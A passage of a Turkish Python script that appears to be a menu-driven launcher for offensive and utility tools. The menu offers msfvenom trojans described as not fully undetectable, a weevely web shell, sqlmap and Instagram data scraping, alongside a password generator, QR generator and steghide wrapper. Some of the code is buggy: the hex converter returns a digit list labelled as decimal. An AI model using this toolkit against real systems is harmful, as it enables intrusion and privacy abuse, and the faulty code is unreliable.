                "y",
                "z",
                "ğ",
                "ü",
                "ş",
                "ı",
                "ö",
                "ç",
                "A",
                "B",
                "C",
                "D",
                "E",
                "F",
                "G",
                "H",
                "I",
                "J",
                "K",
                "L",
                "M",
                "N",
                "O",
                "P",
                "Q",
                "R",
                "S",
                "T",
                "U",
                "V",
                "W",
                "X",
                "Y",
                "Z",
                "1",
                "2",
                "3",
                "4",
                "5",
                "6",
                "7",
                "8",
                "9",
                "0",
                " ",
                "!",
                "@",
                "#",
                "$",
                "%",
                "^",
                "&",
                "*",
                "(",
                ")",
                "Ğ",
                "Ü",
                "Ş",
                "İ",
                "Ö",
                "Ç",
            ]

            password = ""

            for x in range(passlen.get()):
                password = password + random.choice(pass1)

            passstr.set(password)

        def copytoclipboard():
            random_password = passstr.get()
            pyperclip.copy(random_password)

        Label(root, text="Parola Türetici", font="calibri 20 bold").pack()

        Label(root, text="Parola uzunluğu gir").pack(pady=3)

        Entry(root, textvariable=passlen).pack(pady=3)

        Button(root, text="Parola Türet", command=generate).pack(pady=7)

        Entry(root, textvariable=passstr).pack(pady=3)

        Button(root, text="Panoya Kopyala", command=copytoclipboard).pack()

        root.mainloop()

    def qr_code():
        from PIL import Image

        subprocess.call(["clear"])
        subprocess.call(["figlet", "QR CODE"])
        while True:
            ques = input(
                "Qr Code üreticisini seçtiniz. Devam etmek ister misiniz? e/h >> "
            )

            if ques.lower() == "e":
                subprocess.call(["clear"])
                subprocess.call(["figlet", "QR CODE"])

                class QR_Gen(object):
                    def __init__(self, text):
                        self.qr_image = self.qr_generator(text)

                    @staticmethod
                    def qr_generator(text):
                        qr_code = pyqrcode.create(text)
                        file_name = "QR Code Sonucu"
                        save_path = os.path.join(os.path.expanduser("~"), "Desktop")

                        name = f"{save_path}{file_name}.png"
                        qr_code.png(name, scale=10)
                        image = Image.open(name)
                        image = image.resize((400, 400), Image.ANTIALIAS)
                        image.show()
                        print(f"\nSonuç ROOT dizinine {name} olarak kaydedildi.")

                if __name__ == "__main__":
                    QR_Gen(input("\n[QR] Yazı veya Link girin >> "))

            elif ques.lower() == "h":
                confirm = input("Çıkmak istediğinizden emin misiniz? e/h >> ")

                if confirm.lower() == "e":
                    print("\nGörüşmek üzere :)")
                    time.sleep(2)
                    subprocess.call(["clear"])
                    sys.exit()

                elif confirm.lower() == "h":
                    print("Uygulamaya geri döndürülüyorsunuz...")
                    time.sleep(2)
                    qr_code()
            else:
                print("Bir Hatayla karşılaşıldı, Yönlendiriliyorsunuz...")
                time.sleep(2)
                subprocess.call(["clear"])
                qr_code()

    def hexa_to_deca():
        subprocess.call("clear")
        subprocess.call(["figlet", "HEX 2 DEC"])
        while True:
            ques = input(
                "Hexadecimal Decimal dönüştürücüyü seçtiniz. Devam etmek ister misiniz? e/h >> "
            )
            if ques.lower() == "e":

                def hexa_convert(hex_string):

                    subprocess.call(["clear"])

                    subprocess.call(["figlet", "HEX 2 DEC"])

                    result = []
                    hex_string = reversed(hex_string)
                    convertions = {
                        "A": 10,
                        "B": 11,
                        "C": 12,
                        "D": 13,
                        "E": 14,
                        "F": 15,
                    }
                    for char in hex_string:
                        try:
                            result.append(int(char))
                        except:
                            for key in convertions:
                                if key == char:
                                    result.append(int(convertions[char]))
                                else:
                                    continue
                    result = [*reversed(result)]
                    return result

                subprocess.call(["clear"])
                subprocess.call(["figlet", "HEX 2 DEC"])
                string = input("Hexadecimal String'i Girin >> ").upper()
                print("Decimal'a dönüştürüldü >> ", hexa_convert(string))
                time.sleep(10)
            elif ques.lower() == "h":
                confirm = input("Çıkmak istediğinizden emin misiniz? e/h >> ")

                if confirm.lower() == "e":
                    print("\nGörüşmek üzere :)")
                    time.sleep(2)
                    subprocess.call(["clear"])
                    sys.exit()

                elif confirm.lower() == "h":
                    print("Uygulamaya geri döndürülüyorsunuz...")
                    time.sleep(2)
                    subprocess.call(["clear"])
                    hexa_to_deca()

    def steg():
        subprocess.run(["clear"])
        subprocess.call(["figlet", "STEGHIDE"])

        while True:
            ques = input("Steghide'ı seçtiniz. Devam etmek ister misiniz? e/h >> ")
            if ques.lower() == "e":
                subprocess.call(["clear"])
                subprocess.call(["figlet", "STEGHIDE"])

                print(
                    """
                1)Resime Dosya Göm
                2)Resimden dosya çıkart
                3)Steghide programı nedir? // Steganografi nedir?
                """
                )

                choose = int(input("Seçiminizi Girin >> "))

                if choose == 1:
                    subprocess.call(["clear"])
                    subprocess.call(["figlet", "STEGHIDE"])

                    dosya1 = input("Dosya adını girin >> ")
                    resim1 = input("Resim ismini girin >> ")

                    subprocess.call(["steghide", "embed", "-cf", resim1, dosya1])
                    print("Dosya bulunduğunuz klasöre kaydedildi...")

                elif choose == 2:
                    subprocess.call(["clear"])
                    subprocess.call("STEGHIDE")

                    dosya2 = input("Dosya adını girin >> ")

                    subprocess.call(["steghide", "extract", "-sf", dosya2])
                    print("Dosya bulunduğunuz klasöre kaydedildi...")
                elif choose == 3:
                    print(
                        "Steganografi, eski Yunanca’da “gizlenmiş yazı” anlamına gelir ve bilgiyi gizleme bilimine verilen addır. Steganografi’nin şifrelemeye göre en büyük avantajı bilgiyi gören bir kimsenin gördüğü şeyin içinde önemli bir bilgi olduğunu fark edemiyor olmasıdır, böylece içinde bir bilgi aramaz"
                    )
                    print(
                        "\nbilgisayarlarda kullanılan >>  Steganografi bir dosyanın içine gizli bir dosya daha koymak."
                    )
                    print(
                        "\n\nSTEGHIDE : Steghide bilgisayarlar için Steganografi işlemini otomatik olarak yapan bir yazılımdır.Genelde resimlerin içine dosya gömmek için kullanılır."
                    )
                    geri = input("Geri dönmek ister misiniz? e/h >> ")
                    if geri.lower() == "e":
                        steg()
                    else:
                        print("görüşürüz")
                        sys.exit()
                else:
                    print("Hatalı işlem...")
                    sys.exit()
            elif ques.lower() == "h":
                confirm = input("Çıkmak istediğinizden emin misiniz? e/h >> ")

                if confirm.lower() == "e":
                    print("\nGörüşmek üzere :)")
                    time.sleep(2)
                    subprocess.call(["clear"])
                    sys.exit()

                elif confirm.lower() == "h":
                    print("Uygulamaya geri döndürülüyorsunuz...")
                    time.sleep(2)
                    subprocess.call(["clear"])
                    steg()

    def star_wars():
        os.system("clear")
        print("Canın mı sıkıldı :(")
        time.sleep(2)
        print("o zaman eğlence molası :)")
        time.sleep(2)
        ques = input("Terminalde Star Wars izlemek ister misin? e / h : ")
        if ques == "e":
            os.system("telnet towel.blinkenlights.nl")
        elif ques == "h":

            print("görüşürüz")
            sys.exit()
        else:
            print("Hatalı seçim")

    print(
        """
        1)netdiscover
        2)nikto
        3)msfvenom(%100 fud değil)
        4)rootkit scanner
        5)weevely web shell
        6)skipfish
        7)nmap
        8)sqlmap
        9)telefon osint
        10)dnsmap
        11)dirb
        12)theHarvester
        13)wafw00f
        14)dig
        15)wiki-search
        16)insta_explore
        17)url_scraper
        18)IP_INFORMATION
        19)youtube video indirici
        20)Cryptography
        21)Speed_Test
        22)png'yi jpg'ye dönüştür
        23)domain check
        24)Instagram id,pp,data
        25)mac changer
        26)URL kısaltıcı
        27)GUI'li video indirici
        28)Parola Türetici
        29)QR Code üretici
        30)Hexadecimal To Decimal Dönüştürücü
        31)Steghide
        32)Canın mı Sıkıldı?Buraya gir:)
        99)çıkış
        """
    )
    secim = int(input("Seçiminizi Girin : "))

    ###seçimler

    if secim == 1:
        netdiscover()

    elif secim == 2:
        nikto()

    elif secim == 3:
        trojan()

    elif secim == 4:
        rootkit()

    elif secim == 5:
        weevely()

    elif secim == 6:
        skipfish()

    elif secim == 7:
        nmap()

    elif secim == 8:
        sqlmap()

    elif secim == 9:
        osint_by_phone()

    elif secim == 10:
        dnsmap()

    elif secim == 11:
        dirb()

    elif secim == 12:
        theHarvester()

    elif secim == 13:
        firewall_detect()

    elif secim == 14:
        dig()

    elif secim == 15:
        wiki()

    elif secim == 16:
        insta_explore()

    elif secim == 17:
        url_scraper()

    elif secim == 18:
        ip_information()

    elif secim == 19:
        video_downloader()

    elif secim == 20:
        crypto()

    elif secim == 21:
        speed_test()

    elif secim == 22:
        png_to_jpg()

    elif secim == 23:
        domain_check()

    elif secim == 24:
        pp_download()

    elif secim == 25:
        macchanger()

    elif secim == 26:
        shorten_url()

    elif secim == 27:
        video_gui()

    elif secim == 28:
        generate_password()

    elif secim == 29:
        qr_code()

    elif secim == 30:
        hexa_to_deca()

    elif secim == 31:
        steg()

    elif secim == 32:
        star_wars()

    elif secim == 99:
        print("Görüşmek Üzere")
        sys.exit()

    else:
        print("Hatalı Giriş Yaptınız ...")

except KeyboardInterrupt:

    def star_wars():
        os.system("clear")
        print("Canın mı sıkıldı :(")
        time.sleep(2)

    os.system("clear")
    print("\nHoşçakal:)")

    def star_wars():
        os.system("clear")
        print("Canın mı sıkıldı :(")
        time.sleep(2)

    def star_wars():
        os.system("clear")
        print("Canın mı sıkıldı :(")
        time.sleep(2)
